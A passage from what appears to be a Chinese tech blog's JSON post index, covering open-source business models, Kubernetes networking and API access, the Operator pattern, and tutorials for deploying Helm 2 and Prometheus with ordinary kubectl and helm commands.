通常，开源项目的代码质量更高，文档更完善，中断风险更小。\n传统的开发模式中，项目代码封闭在公司内，很少会有人查看。开源之后，项目面向的是整个社区。无论是代码，还是文档，开发者都会更加严谨、负责。\n同时，开源意味着更多人的参与，推动内部人员规范化开发流程，对外进行输出。参与开发的外部人员，由于亲身参与，也会对项目赋予特殊情感，更愿意去使用和推广。\n2.3 更有利于整合上下游 通过开源，开发者还可以快速获取上下游的反馈信息，对产品进行调整、改进，有利于产品迭代。\n开源也意味着开始经营上下游的生态圈。如果一个项目，没有上游的支持和下游的使用，那么它也就没有生命力。构建更大的利益共同体，扩大项目的影响力，占领相关领域才能构筑强大的竞争优势。\n3. 开源的盈利方式 开源不会成为赢利点，需要其他途径补贴。\n销售云服务补贴开源 对于用户来说，部署、维护、升级都是成本。通过服务便捷，可以获得收费机会。常见的模式有两种: SaaS 模式和 IaaS 模式。SaaS 模式直接提供远程服务，计时计量收费，例如 Sentry。IaaS 模式通过公有云平台服务商整合服务，销售 IaaS 资源。\n发行多版本 开源只提供了核心模块的源码，无法满足全部的企业需要。定制化开发、功能增强型开发会成为收费点。通过发行社区版、企业版、高级版等梯度产品，社区版作为试验区，逐步向收费版本引导。\n运维服务 对企业真正有价值的是软件运行时，而不是静态的代码。各种运维场景，故障处理，层出不穷的安全漏洞和补丁解决方法，都可以成为付费点。\n培训、认证、授权 通过相关培训、认证、授权等，可以作为赢利点。\n销售周边 除了看不见的服务，还有看得见的周边。比如，销售公仔、文化衫、纪念品等，也可以作为收入来源之一。\n被收购。独立的组织，被巨头收购也是一个不错的归宿。 4. 开源需要做些什么 并不是每个产品都适合开源，商业开源是为了生态。我观察到有些商业公司，在 github 上开源项目，获得了高星。但是，他们没有持续运营，代码提交主要集中在数年前的半年内。我认为，这样的项目没有开源的必要。\n一个好的商业开源项目，应该做好这几件事:\n领先的方案实现 开源的正确打开方式是，一定要在领域提出先进的方案，并完成核心实现。开源只会锦上添花，不会雪中送炭。只有项目本身具有价值，才能吸引大家广泛参与。\n完善的文档 文档是极其重要的项目说明。一份清晰、详细的文档，有利于其他人的参与。\n热衷传播 酒香不怕巷子深的时代已经过去，同类的竞品层出不穷。如果不主动地宣传、布道，项目很容易错过风口期，最终导致失败。\n我们应该主动地宣传项目，与同行，与用户，更多的交流。进行传播的同时，开发者也能获得反馈，进行优化，形成良好的口碑\n维护核心用户群 在项目还没有很成功时，经营好核心用户群非常重要。产品是需要不断打磨、迭代才会成为精品。这个过程中，不仅需要开发代码，更需要用户参与。核心用户群是产品第一用户，也是社区口碑的传播者。\n记录 FQA 早期阶段，让开发者直面客户人群进行 QA ，有利于产品快速迭代。当产品打磨到足够稳定时，我们应该记录 FQA 。记录常见问题可以降低对开发者的干扰，引导用户回答用户问题，回归社区。\n定期分享 没有哪一个行业像 IT 一样，如此热爱分享。最近几年，我观察到，各种社区活动越来越多，开发者也开始从线上至线下参与其中。\n社区活动就是产品宣传的机会，如果有资源、有一定影响力，也可以自行发起活动。线上线下持续地运营，聚拢用户，形成圈子，越来越重要。\n生态合作 开源最终拼的是生态。生态也会给开源组织带来更多变现的可能性。生态的建设应该围绕着合作共赢的思路建设，比如平台开发商提供平台、构筑应用市场，应用开发商开发应用在平台上销售挣钱，平台因为有这些应用更加具有竞争力。\n5. 参考 http://crva.io/documents/Comments-on-Risks-of-Open-Source-Projects.pdf https://www.gnu.org/philosophy/open-source-misses-the-point.zh-cn.html http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html ","description":"","id":369,"section":"post","tags":["博文","开源","思考","商业模式"],"title":"开源正在重构商业模式","uri":"https://www.chenshaowen.com/blog/open-source-is-refactoring-the-business-model.html"},{"content":"1. Docker 的网络模型 1.1 bridge 模式 默认使用 bridge 模式，也可以使用 --net=bridge 指定 bridge 模式。\nbridge 模式下，容器连接到同一个虚拟网桥 docker0 上。docker0 通常会占用 172.17.0.1/16 网段。同一个网桥上的容器之间，可以通过 ip 直接通信。\n1.2 host 模式 使用 --net=host 指定 host 模式。\nhost 模式，容器与主机共享 Network Namespace。容器直接使用主机的 IP 地址，同时，可以查看主机上的所有网络设备。\n1.3 none 模式 使用 --net=none 指定，none 模式。\nnone 模式为容器分配 Network Namespace，但是不对容器进行任何网络配置。也就是说，容器没有网卡、IP、路由等网络配置。\n1.4 container 模式 使用 --net=container:container_id/container_name 指定 container 模式。\ncontainer 模式可以指定与另外一个已经存在的容器，共享 IP、端口等网络资源。这两个容器之间除了网络相同，其他都是隔离的，可以通过 IO 网卡进行通信。\n2. Kubernetes 的网络模型 2.2 Kubernetes 网络的基本原则 每个 Pod 都拥有一个独立的 IP 地址。所有的 Pod 都在一个可以直接连通的、扁平的网络空间中。\n用户不需要额外考虑如何建立 Pod 之间的连接，也不需要考虑将容器端口映射到主机端口等问题。\n所有的容器都可以在不用 NAT 的方式下与其他的容器通信；所有节点都可以在不用 NAT 的方式下与所有容器通信；容器的地址和别人看到的地址是同一个地址。\n2.1 Kubernetes 中的 IP 类型 Kubernetes 中的 IP 有三种:\nPod IP IP per Pod，每个 Pod 启动时，会自动创建一个镜像为 gcr.io/google_containers/pause 的容器，容器内部与外部的通信经由此容器代理，该容器的 IP 就是 Pod IP 。\nCluster IP Cluster IP 并不与实际网卡或虚拟设备绑定，而是 Iptables 规则。例如，Service Cluster IP 就是由 kube-proxy 使用 Iptables 规则重定向到其本地端口，再负载均衡到后端 Pod 上。\n外部 IP 上面的 IP 都是用于内部通信，对于外部服务，需要暴露一个外部可以访问的 IP，通常是代理节点的物理 IP 地址。这里同样需要借助 kube-proxy 和 Iptables 将流量转发到后端 Pod 上。\n3. Kubernetes 中的网络场景 3.1 同一个 Pod 内的容器 Pod 内的容器共享同一个网络空间，容器之间的通信可以用 localhost 地址 + 容器端口实现。\n3.2 同一个 Node 内的容器 docker0 是同一个 Node 中 Pod 的路由。Pod 的地址网段相同，可以进行直接通信。\n3.3 不同 Node 内的容器 不同 Node 间容器通信，通过将 Pod 的 IP 和所在的 Node 的 IP 关联起来实现。\nNode 之间的通信，通过其网卡转发实现。要求对整个集群的 Pod-IP 分配需要进行规划，Pod 的 IP 地址不能冲突。\n4. 两种网络模型: CNI，CNM CNM 与 Docker 绑定紧密。CNI 兼容其他容器技术（例如，rkt）及上层编排系统（Kubernetes 、Mesos)，社区更活跃。\n4.1 CNI CNI 是 CoreOS 和 Google 公司主导制定的网络模型。这个模型定义了两个组件，容器管理、网络插件。它们之间通过 Json 格式通信，实现容器的网络功能。插件实现具体功能。\n4.2 CNM CNM 是 Docker 公司主导的网络模型，Libnetwork 是 CNM 规范的实现，Libnetwork 提供了 Docker 守护程序和网络驱动程序之间的接口。网络控制器负责将驱动程序与网络配对。每个驱动程序负责管理其拥有的网络，包括提供给该网络的服务。每个网络有一个驱动程序，多个驱动程序可以与连接到多个网络的容器同时使用。\n4.3 CNI 插件 Flannel Flannel 是 CoreOS 开发的项目。相较于其他插件，Flannel 更容易安装和配置。Flannel 使用 Overlay 创建网络。\nCalico Calico 的功能更加全面，不仅提供主机与 Pod 之间的网络连接，还涉及网络安全和管理。\nCalico 使用 BGP 路由协议在主机之间路由数据包，性能更好。除此，Calico 还提供了强大的网络策略配置，允许用户自由配置转发规则。\nCanal Canal 试图将 Flannel 提供的网络层与 Calico 的网络策略功能集成在一起。\n5. 参考 http://www.youruncloud.com/blog/131.html ","description":"","id":370,"section":"post","tags":["整理","Kubernetes","API","对象"],"title":"Kubernetes 之网络","uri":"https://www.chenshaowen.com/blog/networks-of-kubernetes.html"},{"content":"1. Kubernetes 中的对象 Kubernetes 对象是系统中的持久实体，用于表示集群的状态。用户通过操作对象，与 Kubernetes 进行交互，告诉系统自己期望的工作负载情况。\n对象的操作是通过 Kubernetes API 来实现的。每个 Kubernetes 对象包含两个嵌套的对象字段，Spec 和 Status。Spec 描述了期望的对象状态，Status 描述了实际的对象状态。Kuernetes API 对 Spec 字段进行操作，系统会比较 Spec 与 Status 的差异，采取一定的措施，使得 Spec 与 Status 保持一致。这就是声明式 API，用户只需要告诉系统期望的状态，系统帮你达成状态。\n在 Kubernetes 中，API 是非常核心的部分。用户对集群的操作，都是通过调用 API 操作对象来实现的。\n2. 什么是 Apiserver apiserver 提供了对各类资源对象，如 Pod、Service、Deployment、CRD 等的增删改查，以及 Watch 的 API 接口，是整个集群的操作入口。下面是 apiserver 提供的具体功能:\n集群管理的 RESTful API 接口 集群通信的枢纽，其他模块之间都通过 apiserver 进行交互，只有 apiserver 才能操作 etcd 集群安全管理机制 资源配额控制的入口 kube-apiserver 采用的是 HTTP 协议、 Json 数据格式的 API。如下图所示，URL 端点的格式主要由三部分构成:\n例如，/apis/batch/v1/namespaces/$NAMESPACE/job 。\nGroup，逻辑上相关的 Kinds 的集合。\nVersion，每个 Group 可以存在多个版本。例如，v1alpha1，然后升为 v1beta1，最后稳定为 v1 版本。\nResource，HTTP 操作实体的表现形式，可以是单个资源，../namespaces/default，也可以是资源集合，../jobs 。\nGroup、Version、Resource（GVR）可以唯一确定一个 HTTP 资源端点。\n3. Apiserver 工作原理 apiserver 提供了 Kubernetes 的 RESTful API，实现了认证、授权、准入控制等安全校验功能，同时也负责集群状态的存储操作。\n以 /apis/batch/v2alpha1/jobs 为例，GET 请求的处理过程如下图所示：\n4. 使用 Kubernetes API apiserver 同时提供了 https 和 http 协议的 API，其中 http API 是非安全接口，不做任何认证授权机制，不建议生产环境启用，仅允许本地访问。https 和 http 接口提供的 RESTful API 格式相同。\nkubectl 实际上就是一个 Kubernetes API 客户端。用户将对象信息配置在 yaml 文件中，kubectl 在发起 API 请求时，将这些信息转换成 Json 格式，然后调用 apiserver 的接口。\n除了直接使用 kubectl 进行操作，下面提供两种 Kubernetes API 的使用和调试方式:\n4.1 本地 proxy 执行命令，并保持会话:\n1 2 kubectl proxy Starting to serve on 127.0.0.1:8001 默认为 8001 端口，也可以通过参数指定服务端口，后台运行。如: kubectl proxy --port=8001 \u0026amp; 。\nproxy 作为反向代理与远程 minikube 连接，对本地提供服务。本地可以直接访问 http://127.0.0.1:8001 ，对集群进行操作。\n另启一个会话:\n1 2 3 4 5 6 7 8 9 10 11 12 13 curl http://127.0.0.1:8001/api { \u0026#34;kind\u0026#34;: \u0026#34;APIVersions\u0026#34;, \u0026#34;versions\u0026#34;: [ \u0026#34;v1\u0026#34; ], \u0026#34;serverAddressByClientCIDRs\u0026#34;: [ { \u0026#34;clientCIDR\u0026#34;: \u0026#34;0.0.0.0/0\u0026#34;, \u0026#34;serverAddress\u0026#34;: \u0026#34;192.168.0.2:8443\u0026#34; } ] } 4.2 直接访问 由于 Kubernetes 集群已经对外开放了 https 访问入口，我们可以直接访问 apiserver 。\n这种方式与 kubectl 的访问方式一样，需要指定一些配置。\n主机、端口、证书等配置，可以通过 kubectl 命令查看:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kubectl config view apiVersion: v1 clusters: - cluster: insecure-skip-tls-verify: true server: https://your_host_ip:8443 name: minikube contexts: - context: cluster: minikube user: minikube name: minikube current-context: minikube kind: Config preferences: {} users: - name: minikube user: client-certificate: ~/.minikube/client.crt client-key: ~/.minikube/client.key 使用 curl 进行访问\n1 curl --cacert ~/.minikube/ca.crt --cert ~/.minikube/client.crt --key ~/.minikube/client.key https:/your_host_ip:8443/api/ 在项目中，可以使用封装好的客户端调用 Kubernetes API。在 https://github.com/kubernetes-client 上已经提供了很多语言的 Client，Go、Python、Javascript、Java、Perl 等。其他 OpenAPI 支持的语言，可以通过 gen 工具生成相应的 Client。\n5. 参考 https://feisky.gitbooks.io/kubernetes/components/apiserver.html https://blog.openshift.com/kubernetes-deep-dive-api-server-part-1/ ","description":"","id":371,"section":"post","tags":["整理","Kubernetes","API","对象"],"title":"Kubernetes 之 API","uri":"https://www.chenshaowen.com/blog/api-of-kubernetes.html"},{"content":" Helm 是 Kubernetes 的包管理工具；Operator 用于管理 Kubernetes 的有状态分布式应用。本文主要描述如何使用 Helm、Operator 在 Minikube 集群上快速部署 Prometheus，并使用 Grafana 查看监控数据。Minikube 安装可以参考，搭建远程 Kubernetes 开发环境，Helm 配置可以参考，Kubernetes 的包管理器 \u0026ndash; Helm，Operator 可以参考，Kubernetes复杂有状态应用管理框架\u0026ndash;Operator。\n1. 安装 Prometheus Operator 1 helm install --name prometheus-operator --namespace=monitoring stable/prometheus-operator 2. 安装 Prometheus 1 helm install --name prometheus --set serviceMonitorsSelector.app=prometheus --set ruleSelector.app=prometheus --namespace=monitoring stable/prometheus 3. 安装 Alertmanager 1 helm install --name alertmanager --namespace=monitoring stable/alertmanager 4. 暴露服务 为了方便访问 Prometheus 和 Grafana，我们将 Service 类型改为 NodePort。\n查看服务，找到对应的服务名:\n1 kubectl get svc -n monitoring 暴露服务：\n1 2 kubectl patch svc prometheus-operator-grafana -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;NodePort\u0026#34;}}\u0026#39; -n monitoring kubectl patch svc prometheus-operator-prometheus -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;NodePort\u0026#34;}}\u0026#39; -n monitoring 查看服务，找到对应的访问端口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kubectl get svc -n monitoring NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE alertmanager-operated ClusterIP None \u0026lt;none\u0026gt; 9093/TCP,6783/TCP 16h prometheus-alertmanager ClusterIP 10.98.63.83 \u0026lt;none\u0026gt; 80/TCP 16h prometheus-kube-state-metrics ClusterIP None \u0026lt;none\u0026gt; 80/TCP 16h prometheus-node-exporter ClusterIP None \u0026lt;none\u0026gt; 9100/TCP 16h prometheus-operated ClusterIP None \u0026lt;none\u0026gt; 9090/TCP 16h prometheus-operator-alertmanager ClusterIP 10.105.201.137 \u0026lt;none\u0026gt; 9093/TCP 16h prometheus-operator-grafana NodePort 10.110.199.163 \u0026lt;none\u0026gt; 80:32467/TCP 16h prometheus-operator-kube-state-metrics ClusterIP 10.104.56.81 \u0026lt;none\u0026gt; 8080/TCP 16h prometheus-operator-operator ClusterIP 10.105.127.162 \u0026lt;none\u0026gt; 8080/TCP 16h prometheus-operator-prometheus NodePort 10.104.241.128 \u0026lt;none\u0026gt; 9090:32044/TCP 16h prometheus-operator-prometheus-node-exporter ClusterIP 10.96.160.143 \u0026lt;none\u0026gt; 9100/TCP 16h prometheus-pushgateway ClusterIP 10.100.107.222 \u0026lt;none\u0026gt; 9091/TCP 16h prometheus-server ClusterIP 10.107.184.180 \u0026lt;none\u0026gt; 80/TCP 16h Grafana 访问入口：http://your_host_ip:32467， Prometheus 访问入口：http://your_host_ip:32044。\n5. 查找 admin 账户密码 1 kubectl get secret --namespace monitoring prometheus-operator-grafana -o jsonpath=\u0026#34;{.data.admin-password}\u0026#34; | base64 --decode ; echo Grafana 页面：\nPrometheus 页面：\n","description":"","id":372,"section":"post","tags":["博文","Kubernetes","Helm","Operator"],"title":"使用 Helm 和 Operator 快速部署 Prometheus","uri":"https://www.chenshaowen.com/blog/quickly-deploy-prometheus-using-helm-and-operator.html"},{"content":"1. 缘起 最初，有两名 CoreOS 的员工，为了更方便部署 etcd 集群，在 etcdCluster 对象的增、删、改事件上绑定了相应的逻辑操作，借助 Kubernetes 来自动化管理 etcd 集群。\n在几个月之后的 KubeCon 大会上，他们分享了这种称之为 Operator 的方案，得到社区的强烈回响。随后，大量项目宣布支持以 Operator 的方式进行运行和管理。\n但来自 Google 的 Kubernetes 核心开发者并不认同 Operator。理由是，Operator 破坏了 Kubernetes 原有的设计，游离于 Controller Manager 之外，不受控制。\n就在核心开发者准备放弃 Operator 之际，CoreOS 的 CTO 在社区发起征集令，收集使用这种方式的项目。由于使用的项目太多，Kubernetes 最终接纳了 Operator。\n2. 原理 Operator 就是 CRD + Controller。CRD 定义用户的资源；Controller 监听 CRD 对象实例的增、删、改事件，然后执行相应的业务逻辑。\nKubernetes 中的每个资源都是一个 API 对象的集合。除了内置的资源类型，用户还可以自定义资源类型对 Kubernetes API 进行扩展。自定义资源，也可以直接使用 API 或 kubectl 进行操作。\nOperator 仅依赖于 Kubernetes 申明式 API 和 Controller 的能力，实现了用户资源与具体操作的定制化关联。\n2.1 CRD Kubernetes 中的基础资源类型有 Pod、Service、Job、Deployment 等，表达能力有限。Kubernetes 提供了内建的类型 CRD（CustomResourceDefinition），用于自定义资源。\n下面是一个定义资源和创建对象的例子:\n1，创建新的资源类型\nresourcedefinition.yaml:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 apiVersion: apiextensions.k8s.io/v1beta1 kind: CustomResourceDefinition metadata: # name must match the spec fields below, and be in the form: \u0026lt;plural\u0026gt;.\u0026lt;group\u0026gt; name: crontabs.stable.example.com spec: # group name to use for REST API: /apis/\u0026lt;group\u0026gt;/\u0026lt;version\u0026gt; group: stable.example.com # version name to use for REST API: /apis/\u0026lt;group\u0026gt;/\u0026lt;version\u0026gt; version: v1 # either Namespaced or Cluster scope: Namespaced names: # plural name to be used in the URL: /apis/\u0026lt;group\u0026gt;/\u0026lt;version\u0026gt;/\u0026lt;plural\u0026gt; plural: crontabs # singular name to be used as an alias on the CLI and for display singular: crontab # kind is normally the CamelCased singular type. Your resource manifests use this. kind: CronTab # shortNames allow shorter string to match your resource on the CLI shortNames: - ct 执行命令：\n1 kubectl apply -f resourcedefinition.yaml Kubernetes 会在 /apis/stable.example.com/v1/namespaces/*/crontabs/... 端点，新建 RESTful API。\n创建自定义对象: my-crontab.yaml\n1 2 3 4 5 6 7 apiVersion: \u0026#34;stable.example.com/v1\u0026#34; kind: CronTab metadata: name: my-new-cron-object spec: cronSpec: \u0026#34;* * * * */5\u0026#34; image: my-awesome-cron-image 执行命令:\n1 kubectl apply -f my-crontab.yaml 查看对象: 1 kubectl get crontab 2.2 Controller 下面是 Controller 的实现逻辑:\n一个 Controller 有一个或多个 Informer 来跟踪某一个资源。Informer 与 apiserver 保持通讯，一旦发现资源发生变化，立即调用 Callbacks，将对象数据放入 Workqueue 中。\nWorkqueue 作为 Worker 的任务队列。Worker 首先会比较 Workerqueue 中资源对象的状态与预期状态的差别，然后通过 client-go 向 apiserver 发送执行请求，直到达成预期状态。\n3. 用途 Operator 项目的初衷是，开发者将运维能力固化在代码中，让运维更容易。核心在于对领域能力的实现和封装。\n对于无状态应用的部署和管理，Kubernetes 得心应手。而有状态应用往往存在拓扑关系，对某些外部资源有着绑定性的依赖。虽然 Kubernetes 内置了 StatefulSet 有状态对象，但要求开发者在启动命令中添加大量领域逻辑，增加了使用难度。\nOperator 的出现，为应用的动态描述提出了一套行之有效的实现规范。\nOperator 将分布式应用的使用门槛降到了最低。无论一个分布式应用多么复杂，只要它为用户提供了 Operator ，那么只需要两条命令即可搞定，以 kafka 为例:\n1 2 kubectl apply -f kafka-operator.yaml kubectl apply -f kafka-cluster.yaml Operator 的用途是管理有状态分布式应用，例如数据库、缓存、监控等。\n4. 如何开发 Operator 4.1 KubeBuilder 使用 client-go 作为 Kubernetes 的客户端，用 KubeBuilder 来生成骨架代码。\nKubeBuilder 封装和抽象了 controller-runtime 和 controller-tools ，用于快速构建 Operator。通过 KubeBuilder 生成 Operator 的脚手架，开发者不必关注 apiserver 通信、请求队列化等细节，只需要专注于业务逻辑的实现。\nKubeBuilder 的工作流程如下：\n创建一个新的工程目录 创建一个或多个资源 API CRD ，然后将字段添加到资源 在控制器中实现协调循环（reconcile loop），watch 额外的资源 在集群中运行测试（自动安装 CRD 并自动启动控制器） 更新引导集成测试测试新字段和业务逻辑 使用用户提供的 Dockerfile 构建和发布容器 4.2 Operator Framework Operator Framework 是 CoreOS 提供的 Operator 开发框架。主要包含两个部分：\nOperator SDK ，用于开发 Operator Operator Lifecycle Manager OLM ，安装、更新和管理 Operator Operator SDK 提供以下工作流开发 Operator：\n使用 SDK 创建一个新的 Operator 项目 通过添加自定义资源（CRD）定义新的资源 API 指定使用 SDK API 来 watch 的资源 定义 Operator 的协调（reconcile）逻辑 使用 Operator SDK 构建并生成 Operator 部署清单文件 5. 参考 http://dockone.io/article/8452 http://dockone.io/article/8467 https://kubernetes.io/docs/tasks/access-kubernetes-api/custom-resources/custom-resource-definitions/ https://coreos.com/operators/ ","description":"","id":373,"section":"post","tags":["整理","Kubernetes","Helm","实践"],"title":"Kubernetes 复杂有状态应用管理框架 -- Operator","uri":"https://www.chenshaowen.com/blog/complex-application-management-framework-operator-for-kubernetes.html"},{"content":"1. 为什么需要 Helm Kubernetes 中一个重要的设计理念就是，声明式的操作。用户通过设置系统的预期状态来改变系统。例如，现在的副本数量是 2 ，需要调整为 3。声明式的处理方式是，修改配置文件中副本数量为 3 ；命令式的处理方式是，发送增加一个副本的命令，+1。\n使用申明式配置的系统更关注结果，对系统设计要求更高。在分布式系统中，任何组件都不是 100 % 可靠的，对使用者来说，声明式配置的系统更加友好。\nKubernetes 采用 yaml 作为配置文件。在 Kubernetes 中部署一个简单的 Jenkins 服务，就得写两个 yaml 文件: jenkins-deployment.yaml 和 jenkins-service.yaml。参考，Kubectl 部署 Jenkins 。再加上其他服务，考虑到多套环境，需要维护的 yaml 文件数量会很大。\n直接维护 yaml，进行部署 ，既不利于项目组织，也不利于维护更新。我们需要一个工具简化应用部署和管理流程。\n2. 什么是 Helm Helm 是 Deis 发起的一个 Kubernetes 包管理器，类似于 Linux 中的 apt 和 yum 工具。Deis 公司已经被微软收购。\n2.1 基本概念 Chart Chart 用来封装 yaml 文件，包含了运行应用所需的镜像、依赖、资源、服务定义等。\nRelease Chart 在 Kubernetes 集群上的实例。每次安装都会创建一个新的 Release ，一个 Chart 可以对应很多个实例。\nRepository 用于发布和存储 Chart 的仓库。\n2.2 基本组件 Helm 采用 C/S 架构，组件有：\nHelm CLI Helm CLI 是 Helm 客户端，运行在本地，负责与其他组件的交互。\nTiller Tiller 是服务器端组件，运行在 Kubernetes 集群上，用于管理 Helm 部署的应用。\nRepository Repository 是 Chart 仓库。\n2.3 Helm 提供的功能 应用打包 应用分发 版本管理 依赖检查 3. Chart 通过创建特定目录结构的文件夹，chart 描述了一组应用资源，用于指导应用部署。\nWordpress 的 chart 包结构:\n1 2 3 4 5 6 7 8 9 Wordpress/ Chart.yaml # Yaml文件，用于描述 Chart 的基本信息，包括名称版本等 LICENSE # [可选] 文本格式的协议 README.md # [可选] 应用介绍、使用说明 requirements.yaml # [可选] 用于存放当前 Chart 依赖的其它 Chart 的说明文件 values.yaml # Chart 的默认值配置文件 charts/ # [可选] 该目录中放置当前 Chart 依赖的其它 Chart templates/ # [可选] 部署文件模版目录，模版填入 values.yaml 中相应值，生成最终的 kubernetes 配置文件 templates/NOTES.txt # [可选] 使用指南 Chart.yaml 文件内容:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 apiVersion: [必须] Chart API 版本，可用值 v1 name: [必须] Chart 名称 version: [必须] 版本，遵循 [SemVer 2 标准](https://semver.org/) kubeVersion: [可选] 兼容的 Kubernetes 版本，遵循 [SemVer 2 标准](https://semver.org/) description: [可选] 一句话的应用描述 keywords: - [可选] 应用关键字列表 home: [可选] 应用主页 URL sources: - [可选] 当前应用下载地址列表 maintainers: [可选] - name: [必须] name email: [可选] email url: [可选] url engine: [可选] 模板引擎，默认值是 gotpl icon: [可选] SVG 或者 PNG 格式的图片地址 appVersion: [可选] 应用版本 deprecated: [可选] boolean 类型，是否不建议使用 tillerVersion: [可选] Chart 需要的 Tiller 版本，遵循 [SemVer 2 标准](https://semver.org/)，需要 \u0026#34;\u0026gt;2.0.0\u0026#34; 4. 安装和使用 由于 Helm 采用的是 C/S 架构，安装分为两部分: 客户端和服务器。不同操作系统，具体命令会有所不同，可以参考 Helm 官方指导文档。这里以 OS X 客户端和 CentOS 服务端 minikube 为例。\n4.1 客户端安装 OS X 执行：\n1 brew install kubernetes-helm CentOS 执行：\n1 2 3 wget https://storage.googleapis.com/kubernetes-helm/helm-v2.12.2-linux-amd64.tar.gz tar -zxvf helm-v2.12.2-linux-amd64.tar.gz mv linux-amd64/helm /usr/local/bin/helm 查看镜像源:\n1 2 3 4 helm repo list NAME URL stable\thttps://kubernetes-charts.storage.googleapis.com local http://127.0.0.1:8879/charts 建议更新镜像源:\n1 2 helm repo add stable https://charts.helm.sh/stable \u0026#34;stable\u0026#34; has been added to your repositories 4.2 服务端安装 安装 tiller 由于配置了远程开发环境(参考: 搭建远程 Kubernetes 开发环境)，在 OS X 上执行：\n1 2 3 4 5 6 7 8 9 10 11 helm init --history-max 200 Creating /Users/username/.helm/repository/repositories.yaml Adding stable repo with URL: https://kubernetes-charts.storage.googleapis.com Adding local repo with URL: http://127.0.0.1:8879/charts $HELM_HOME has been configured at /Users/username/.helm. Tiller (the Helm server-side component) has been installed into your Kubernetes Cluster. Please note: by default, Tiller is deployed with an insecure \u0026#39;allow unauthenticated users\u0026#39; policy. To prevent this, run `helm init` with the --tiller-tls-verify flag. For more information on securing your installation see: https://docs.helm.sh/using_helm/#securing-your-helm-installation 对于 Kubernetes 1.16.0 以上的版本，会碰到 Error: error installing: the server could not find the requested resource 。这是由于 extensions/v1beta1 已经被 apps/v1 替代。执行如下命令进行安装：\n1 helm init --service-account tiller --override spec.selector.matchLabels.\u0026#39;name\u0026#39;=\u0026#39;tiller\u0026#39;,spec.selector.matchLabels.\u0026#39;app\u0026#39;=\u0026#39;helm\u0026#39; --output yaml | sed \u0026#39;s@apiVersion: extensions/v1beta1@apiVersion: apps/v1@\u0026#39; | kubectl apply -f - tiller 将被安装到 kube-system 空间中，可以通过 kubectl get pods --namespace kube-system 命令查看。\n创建访问角色 执行命令：\n1 2 3 kubectl create serviceaccount --namespace kube-system tiller kubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller kubectl patch deploy --namespace kube-system tiller-deploy -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;template\u0026#34;:{\u0026#34;spec\u0026#34;:{\u0026#34;serviceAccount\u0026#34;:\u0026#34;tiller\u0026#34;}}}}\u0026#39; 4.3 查看 Helm 是否可用 执行 helm version 命令时，会检查本地和服务器安装是否就绪。\n1 2 3 4 helm version helm version Client: \u0026amp;version.Version{SemVer:\u0026#34;v2.14.2\u0026#34;, GitCommit:\u0026#34;a8b13cc5ab6a7dbef0a58f5061bcc7c0c61598e7\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;} Server: \u0026amp;version.Version{SemVer:\u0026#34;v2.14.2\u0026#34;, GitCommit:\u0026#34;a8b13cc5ab6a7dbef0a58f5061bcc7c0c61598e7\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;} 如果 Server 端报错，可能是由于 Node 节点上缺失某些包导致，例如，socat 。需要登录服务器，执行 yum install -y socat。\n4.4 创建一个 Chart 部署 新建一个 chart 1 2 helm create hello-chart Creating hello-chart 在 values.yaml 中，可以看到，默认创建的是一个 Nginx 应用。为了方便外网访问测试，将 values.yaml 中 service 的属性修改为:\n1 2 3 service: type: NodePort port: 30003 部署到服务器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 helm install ./hello-chart NAME: alert-koala LAST DEPLOYED: Wed Jul 24 14:21:58 2019 NAMESPACE: default STATUS: DEPLOYED RESOURCES: ==\u0026gt; v1/Deployment NAME READY UP-TO-DATE AVAILABLE AGE alert-koala-hello-chart 0/1 1 0 1s ==\u0026gt; v1/Pod(related) NAME READY STATUS RESTARTS AGE alert-koala-hello-chart-86cdd48bfc-b9dqv 0/1 Running 0 1s ==\u0026gt; v1/Service NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE alert-koala-hello-chart NodePort 10.10.10.10 \u0026lt;none\u0026gt; 30003:32046/TCP 1s 查看部署应用 稍等几秒，应用就运行起来了。打开地址: http://10.10.10:32046 ，即可看到 Nginx 的页面。\n查看 release 1 2 3 4 helm list helm list NAME REVISION\tUPDATED STATUS CHART APP VERSION\tNAMESPACE alert-koala\t1 Wed Jul 24 14:21:58 2019\tDEPLOYED\thello-chart-0.1.0\t1.0 default 打包 chart 1 2 3 helm package hello-chart helm package hello-chart Successfully packaged chart and saved it to: /Users/username/Code/Kubernetes/hello-chart-0.1.0.tgz 注意，需要在 hello-chart 所在上一级目录执行。打包就是压缩 hello-chart 文件夹为一个 tgz 文件。\n删除 release: 1 2 helm delete alert-koala --purge release \u0026#34;alert-koala\u0026#34; deleted 删除之后，应用也就被移除。\n5. 参考 https://docs.openpitrix.io/v0.3/zh-CN/developer-guide/helm-specification/ https://www.qikqiak.com/k8s-book/docs/42.Helm%E5%AE%89%E8%A3%85.html ","description":"","id":374,"section":"post","tags":["博文","Kubernetes","Helm","实践"],"title":"Kubernetes 的包管理器 -- Helm","uri":"https://www.chenshaowen.com/blog/package-manager-helm-of-kubernetes.html"},{"content":"1. Go 的包管理机制 1.1 GOPATH GOPATH 通过 go get 命令，拉取代码放到 GOPATH 目录中。\nGOPATH 的问题是：\n不能进行包版本的管理 使用全局仓库，不能有效进行隔离 1.2 Vendor 1.5 版本开始，Go 中加入了 Vendor 机制。Vendor 解决了 GOPATH 的部分问题。\nVendor 机制通过在项目目录下增加 vendor 文件夹，管理依赖包。\nVendor 的问题是：\n无法解决嵌套依赖 vendor 只在 GOPATH 路径下有效 1.3 Go modules Go modules 允许项目代码放在任意目录，依赖包统一保存在 $GOPATH/pkg/mod 目录下，避免了 vendor 方案的重复代码。\n2. Go modules 特征 Go 通过 GO111MODULE 开关变量，控制 Go modules 特性是否启用，可选值有三个 : auto/on/off 。1.11 版本开始引入，默认值为 auto，1.13 版本默认开启。\nauto 的含义是，当前目录下有 go.mod 则开启。auto 